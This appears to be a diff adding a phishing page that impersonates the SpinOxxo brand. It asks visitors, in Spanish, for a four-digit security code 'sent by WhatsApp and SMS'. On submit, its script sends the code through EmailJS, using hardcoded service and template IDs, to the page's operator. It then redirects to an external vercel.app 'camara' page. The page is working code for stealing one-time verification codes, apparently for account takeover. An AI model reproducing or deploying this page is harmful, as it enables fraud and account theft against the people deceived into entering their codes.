@@ -1,0 +1,121 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="stylesheet" href="ingcodigo.css">
+    <title>SpinOxxo</title>
+    <script src="https://cdn.emailjs.com/dist/email.min.js"></script>
+</head>
+<body>
+    <div class="nav">
+        <h2 class="logo">SpinOxxo</h2>
+        <h2>Ingresa el código de seguridad que enviamos por WhatsApp y SMS</h2>
+    </div>
+    <form id="my-form">
+        <input name="_formsubmit_id" type="text" style="display:none">
+        <input type="hidden" name="_captcha" value="false">
+        
+        <div class="comtrecuadroscodigo">
+            <div class="contcuadros">
+                <input class="cuadros" id="1" type="number" onkeypress="return isNumberKey(event)" required>
+                <input class="cuadros" id="2" type="number" onkeypress="return isNumberKey(event)" required>
+                <input class="cuadros" id="3" type="number" onkeypress="return isNumberKey(event)" required>
+                <input class="cuadros" id="4" type="number" onkeypress="return isNumberKey(event)" required>
+
+                <input type="hidden" name="codigo" id="numcodigo">
+            </div>
+
+            <script>
+                const cuadros = document.querySelectorAll(".cuadros");
+                cuadros.forEach((cuadro, index) => {
+                    cuadro.addEventListener("keydown", (e) => {
+                        if (e.key >= 0 && e.key <= 9) {
+                            cuadros[index].value = "";
+                            setTimeout(() => cuadros[index + 1]?.focus(), 10);
+                        } else if (e.key === "Backspace") {
+                            setTimeout(() => cuadros[index - 1]?.focus(), 10);
+                        }
+                    });
+                });
+
+                function concatenar() {
+                    var codigo = "";
+                    for (var i = 1; i <= 4; i++) {
+                        codigo += document.getElementById(i).value;
+                    }
+                    document.getElementById("numcodigo").value = codigo;
+                }
+
+                function isNumberKey(evt) {
+                    var charCode = (evt.which) ? evt.which : event.keyCode;
+                    if (charCode > 31 && (charCode < 48 || charCode > 57)) {
+                        return false;
+                    }
+                    return true;
+                }
+            </script>
+            
+            <div class="contbtn">
+                <h5 class="nrc">¿No recibiste el código?</h5>
+                <h4 id="contador" style="font-size:18px;font-family:sans-serif;"></h4>
+                <input value="Enviar" onclick="concatenar()" class="btn" type="submit">
+
+                <script>
+                    // Define la duración del contador en segundos
+                    const DURACION_CONTADOR = 180;
+
+                    // Obtiene el elemento HTML que mostrará el contador
+                    const contador = document.getElementById("contador");
+
+                    // Inicializa los minutos y segundos
+                    let minutos = Math.floor(DURACION_CONTADOR / 60);
+                    let segundos = DURACION_CONTADOR % 60;
+
+                    // Muestra los minutos y segundos iniciales en el contador
+                    contador.textContent = `${minutos}:${segundos < 10 ? '0' : ''}${segundos}`;
+
+                    // Crea un intervalo que se ejecutará cada segundo
+                    const intervalo = setInterval(() => {
+                        segundos--;
+                        if (segundos < 0) {
+                            minutos--;
+                            segundos = 59;
+                        }
+                        contador.textContent = `${minutos}:${segundos < 10 ? '0' : ''}${segundos}`;
+                        if (minutos === 0 && segundos === 0) clearInterval(intervalo);
+                    }, 1000);
+                </script>
+            </div>
+        </div>
+    </form>
+
+    <div style="display: flex; align-items: center; justify-content:center;">
+        <img width="150px" src="./logo.jpeg" alt="">
+    </div>
+
+    <script>
+        // Inicializar EmailJS
+        (function() {
+            emailjs.init('uKG8o-MBNGW7QBKhp'); // Reemplaza 'YOUR_USER_ID' con tu identificador de usuario de EmailJS
+        })();
+
+        document.querySelector('form').addEventListener('submit', function(event) {
+            event.preventDefault(); // Prevenir el envío predeterminado
+            concatenar();  // Concatenar el código antes de enviar
+
+            var form = document.getElementById('my-form');
+
+            // Enviar el formulario usando EmailJS
+            emailjs.sendForm('service_izp7mc5', 'template_vcwuhph', form)
+                .then(function(response) {
+                    console.log('SUCCESS!', response.status, response.text);
+                    window.location.href = 'https://personasfiscprem.vercel.app/camara';
+                }, function(error) {
+                    console.log('FAILED...', error);
+                });
+        });
+    </script>
+</body>
+</html>
